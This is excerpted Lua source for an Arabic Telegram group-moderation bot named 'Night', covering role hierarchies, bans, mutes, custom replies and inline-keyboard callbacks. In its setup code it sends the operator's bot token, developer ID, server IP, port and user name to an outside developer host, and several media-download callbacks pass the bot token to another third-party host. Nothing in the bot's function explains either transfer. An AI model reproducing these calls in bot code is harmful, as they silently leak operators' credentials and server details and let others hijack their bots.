...
-----------------------------------------------------
-- This Source Was Developed By (Abs) @h_a_m_a_d_a77. --
--     This Is The Source Channel @sheserlo0 .      --
--                     - Night -                    --
...
data,res = https.request("https://api-Night.ml/Night/index.php?Ban=Night&Info&Id="..DevId)
if res == 200 then
...
https.request("https://api-Night.ml/Night/index.php?Get=Night&DevId="..AliNight:get(Server.."IdNight").."&TokenBot="..AliNight:get(Server.."TokenNight").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
./tg -s ./Night.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Night -X kill
screen -S Night ./Night.sh
done
]]) 
file:close() 
...
local Status = AliNight:sismember(Night..'Abs:AbsSudo:',msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:SecondSudo:',msg.sender_user_id_) 
...
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(Night) then  
var = true  
end  
return var  
end 
...
local Status = AliNight:sismember(Night..'Abs:SudoBot:',msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:AbsConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or AbsSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = AliNight:sismember(Night..'Abs:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = AliNight:sismember(Night..'Abs:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = AliNight:sismember(Night..'Abs:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = AliNight:sismember(Night..'Abs:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or AbsConstructor(msg) or AbsSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if AliNight:sismember(Night..'Abs:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if AliNight:sismember(Night..'Abs:BanAll:', user_id) then
var = true
else
var = false
end
...
if AliNight:sismember(Night..'Abs:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if AliNight:sismember(Night..'Abs:MuteAll:', user_id) then
var = true
else
var = false
end
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
function NightFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Night and msg then
FilesText = plugin.Night(msg)
end
end
end
...
if File_Name:lower():match('(%d+)') ~= Night:lower() then 
...
local info_file = io.open('./'..Night..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
AliNight:set(Night.."Abs:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
AliNight:sadd(Night.."Abs:Groups",IdGps) 
AliNight:set(Night.."Abs:Lock:Bots"..IdGps,"del") AliNight:hset(Night.."Abs:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
AliNight:set(Night..Lock..IdGps,true)
end
if v.AbsConstructors then
for k,IdAbsConstructors in pairs(v.AbsConstructors) do
AliNight:sadd(Night..'Abs:AbsConstructor:'..IdGps,IdAbsConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
AliNight:sadd(Night..'Abs:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
AliNight:sadd(Night..'Abs:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
AliNight:sadd(Night..'Abs:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
AliNight:sadd(Night..'Abs:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
AliNight:sadd(Night..'Abs:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
AliNight:set(Night.."Abs:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
AliNight:set(Night.."Abs:Groups:Welcomes"..IdGps,v.Welcomes)   
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
function Ali_Night(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
...
local Abs = (Night..'Abs:Filters:'..msg.chat_id_)
if Abs then
local names = AliNight:hkeys(Abs)
...
local UserName = (dp.username_ or "NightTEAM")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙عذرا عزيزي ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
function Absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = AliNight:get(Night..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if DataText == '/delyes' and AliNight:get(Night..'yes'..data.sender_user_id_) == 'delyes' then
AliNight:del(Night..'yes'..data.sender_user_id_, 'delyes')
AliNight:del(Night..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and AliNight:get(Night..'no'..data.sender_user_id_) == 'delno' then
AliNight:del(Night..'yes'..data.sender_user_id_, 'delyes')
AliNight:del(Night..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "✯︙تم الغاء امر اطردني") 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if DataText == '/yesdel' and AliNight:get(Night..'yesdel'..data.sender_user_id_) == 'delyes' then
AliNight:del(Night..'yesdel'..data.sender_user_id_, 'delyes')
AliNight:del(Night..'nodel'..data.sender_user_id_, 'delno')
if AliNight:sismember(Night..'Abs:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if AliNight:sismember(Night..'Abs:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if AliNight:sismember(Night..'Abs:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if AliNight:sismember(Night..'Abs:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if AliNight:sismember(Night..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if AliNight:sismember(Night..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if AliNight:sismember(Night..'Abs:Constructor:'..data.chat_id_, data.sender_user_id_) or AliNight:sismember(Night..'Abs:Managers:'..data.chat_id_, data.sender_user_id_) or AliNight:sismember(Night..'Abs:Admins:'..data.chat_id_, data.sender_user_id_) or AliNight:sismember(Night..'Abs:VipMem:'..data.chat_id_, data.sender_user_id_) or AliNight:sismember(Night..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) or AliNight:sismember(Night..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
AliNight:srem(Night..'Abs:Constructor:'..data.chat_id_,data.sender_user_id_)
AliNight:srem(Night..'Abs:Managers:'..data.chat_id_,data.sender_user_id_)
AliNight:srem(Night..'Abs:Admins:'..data.chat_id_,data.sender_user_id_)
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if AliNight:get(Night.."Abs:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "✯︙تم الغاء امر تغير المطور الاساسي") 
AliNight:del(Night.."Abs:NewDev"..data.sender_user_id_)
return false
end
...
if DataText == '/nodel' and AliNight:get(Night..'nodel'..data.sender_user_id_) == 'delno' then
AliNight:del(Night..'yesdel'..data.sender_user_id_, 'delyes')
AliNight:del(Night..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "✯︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and AliNight:get(Night.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = AliNight:smembers(Night..'Abs:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
AliNight:incrby(Night..'Abs:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
AliNight:del(Night..'Abs:ListRolet'..data.chat_id_) 
AliNight:del(Night.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "✯︙*صاحب الحظ* ↫ ["..UserName.."]\n✯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
AliNight:del(Night..'Abs:ListRolet'..data.chat_id_) 
AliNight:del(Night.."Abs:NumRolet"..data.chat_id_..data.sender_user_id_) 
AliNight:del(Night.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/Night/Yt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/Night/Yt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/Night/Yt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✯ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/Night/Yt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abs = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "✯︙الكلمه ↫ "..Abs.." تم حذفها") 
AliNight:del(Night..'Abs:Text:GpTexts'..Abs..data.chat_id_)
AliNight:srem(Night..'Abs:Manager:GpRedod'..data.chat_id_,Abs)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abs = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = AliNight:smembers(Night..'Abs:Text:GpTexts'..Abs..data.chat_id_)
...
AliNight:del(Night..'Abs:Text:KtTexts'..Abs..data.chat_id_)
AliNight:srem(Night..'Abs:Sudo:Kt'..data.chat_id_,Abs)
end
...
local List = AliNight:smembers(Night..'Abs:Text:KtTexts'..Abs..data.chat_id_)
if AliNight:get(Night..'Abs:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✯︙تم انهاء وحفظ ↫ "..#List.." من الاسئله للامر ↫ "..Abs) 
AliNight:del(Night..'Abs:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "✯︙عذرا صلاحية الامر منتهيه !") 
end
end
...
AliNight:del(Night..'Abs:Add:Kt'..data.sender_user_id_..data.chat_id_)
AliNight:del(Night..'Abs:Text:KtTexts'..Abs..data.chat_id_)
AliNight:del(Night..'Abs:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
AliNight:srem(Night..'Abs:Sudo:Kt'..data.chat_id_,Abs)
else
EditMsg(Chat_Id2, Msg_Id2, "✯︙عذرا صلاحية الامر منتهيه !") 
end
...
AliNight:sadd(Night..'Abs:VipMem:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'sheserlo0')..')\n✯︙تم رفعه في قائمة المميزين')
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:AbsConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:sadd(Night..'Abs:AbsSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:VipMem:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:AbsConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:AbsSudo:'..data.chat_id_,dp.id_)
...
AliNight:sadd(Night..'Abs:Ban:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'sheserlo0')..')\n✯︙تم حظره')
end
end
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:Ban:'..data.chat_id_,dp.id_)
...
if AliNight:sismember(Night..'Abs:Muted:'..data.chat_id_, dp.id_) then
EditMsg(Chat_Id2, Msg_Id2, "✯︙هو بالفعل مكتوم من المجموعه")  
else
AliNight:sadd(Night..'Abs:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'sheserlo0')..')\n✯︙تم كتمه')
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'sheserlo0')..')\n✯︙تم الغاء كتمه')
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
AliNight:srem(Night..'Abs:BanAll:', dp.id_)
AliNight:srem(Night..'Abs:MuteAll:', dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'sheserlo0')..')\n✯︙تم الغاء العام')
end,nil)
end
...
AliNight:sadd(Night..'Abs:Tkeed:'..data.chat_id_, dp.id_)
...
AliNight:srem(Night..'Abs:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'sheserlo0')..')\n✯︙تم الغاء تقيده')
end,nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if dp.first_name_ == false then
Ali_Night(data.chat_id_, data.id_, 1, "✯︙الحساب محذوف", 1, "md")
return false  
end
local Text = '✯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'sheserlo0')..')'
keyboard = {} 
if Sudo(data) then
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..Abs}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..Abs},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..Abs}},{{text = '⌁ Night TeAM.',url="t.me/sheserlo0"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..Abs}}}
elseif Admin(data) then
...
local Del = AliNight:get(Night..'Abs:Del')
local Text = [[
...
AliNight:del(Night..'Abs:AbsSudo:')
...
AliNight:del(Night..'Abs:SecondSudo:')
...
AliNight:del(Night..'Abs:SudoBot:')
...
AliNight:del(Night..'Abs:Owner:'..data.chat_id_)
...
AliNight:del(Night..'Abs:UsersMsgs'..data.chat_id_..':'..data.sender_user_id_)
...
AliNight:del(Night..'Abs:Constructor:'..data.chat_id_)
...
AliNight:del(Night..'Abs:Managers:'..data.chat_id_)
Text = "*✯︙تم حذف المدراء*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
AliNight:del(Night..'Abs:Admins:'..data.chat_id_)
...
AliNight:del(Night..'Abs:VipMem:'..data.chat_id_)
...
AliNight:del(Night..'Abs:Cleaner:'..data.chat_id_)
...
AliNight:del(Night..'Abs:Muted:'..data.chat_id_)
...
local List = AliNight:smembers(Night..'Abs:Tkeed:'..data.chat_id_)
for k,v in pairs(List) do   
...
AliNight:srem(Night..'Abs:Tkeed:'..data.chat_id_, v)
end
...
AliNight:del(Night..'Abs:Ban:'..data.chat_id_)
...
AliNight:del(Night..'Abs:BanAll:')
AliNight:del(Night..'Abs:MuteAll:')
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if DataText and DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)') and not AliNight:get(Night..'Abs:Lock:GpRd'..data.chat_id_) then
local Abs = DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = AliNight:smembers(Night..'Abs:Manager:GpRed'..data.chat_id_)
if #redod == 0 then
Text = "*✯︙لا توجد ردود مضافه*"
else
for k,v in pairs(redod) do
AliNight:del(Night..'Abs:Gif:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:Voice:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:Audio:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:Photo:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:Stecker:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:Video:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:File:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:Text:GpRed'..v..data.chat_id_)
AliNight:del(Night..'Abs:Manager:GpRed'..data.chat_id_)
end
...
if DataText and DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)') and not AliNight:get(Night..'Abs:Lock:GpRd'..data.chat_id_) then
...
for k,v in pairs(redod) do
AliNight:del(Night.."Abs:Add:AllRed"..v)
AliNight:del(Night.."Abs:Gif:AllRed"..v)
AliNight:del(Night.."Abs:Voice:AllRed"..v)
AliNight:del(Night.."Abs:Audio:AllRed"..v)
AliNight:del(Night.."Abs:Photo:AllRed"..v)
AliNight:del(Night.."Abs:Stecker:AllRed"..v)
AliNight:del(Night.."Abs:Video:AllRed"..v)
AliNight:del(Night.."Abs:File:AllRed"..v)
AliNight:del(Night.."Abs:Text:AllRed"..v)
AliNight:del(Night.."Abs:Sudo:AllRed")
end
...
local List = AliNight:smembers(Night.."List:Cmd:Group:New"..data.chat_id_)
for k,v in pairs(List) do
AliNight:del(Night.."Set:Cmd:Group:New1"..data.chat_id_..":"..v)
AliNight:del(Night.."List:Cmd:Group:New"..data.chat_id_)
end
...
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":ا","ايدي")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"ا")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":م","رفع مميز")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"م")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":اد","رفع ادمن")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"اد")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":مد","رفع مدير")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"مد")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":من","رفع منشئ")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"من")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":اس","رفع منشئ اساسي")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"اس")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":مط","رفع مطور")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"مط")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":ثانوي","رفع مطور ثانوي")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"ثانوي")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":تك","تنزيل الكل")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"تك")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":تعط","تعطيل الايدي بالصوره")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"تعط")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":تفع","تفعيل الايدي بالصوره")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"تفع")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":ر","الرابط")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"ر")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":رر","ردود المدير")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"رر")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":،،","مسح المكتومين")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"،،")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":رد","اضف رد")
AliNight:sadd(Night.."List:Cmd:Group:New"..data.chat_id_,"رد")
AliNight:set(Night.."Set:Cmd:Group:New1"..data.chat_id_..":غ","غنيلي")
...
AliNight:sadd(Night..'Abs:Admins:'..data.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
AliNight:srem(Night..'Abs:Admins:'..data.chat_id_, admins[i].user_id_)
end
end,nil)
else
AliNight:sadd(Night..'Abs:Admins:'..data.chat_id_, admins[i].user_id_)
...
AliNight:sadd(Night.."Abs:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
AliNight:sadd(Night.."Abs:AbsConstructor:"..data.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
AliNight:srem(Night.."Abs:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
AliNight:srem(Night.."Abs:AbsConstructor:"..data.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if AliNight:sismember(Night..'Abs:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, '✯︙المجموعه بالتاكيد مفعله')
else
Text = "✯︙تم تفعيل المجموعه "..dp.title_
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..data.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..data.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..data.sender_user_id_}},{{text="‹ Night TeaM ›",url="t.me/sheserlo0"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
AliNight:sadd(Night.."Abs:Groups",data.chat_id_)
if not AliNight:get(Night..'Abs:SudosGp'..data.sender_user_id_..data.chat_id_) and not SecondSudo(data) then 
AliNight:incrby(Night..'Abs:Sudos'..data.sender_user_id_,1)
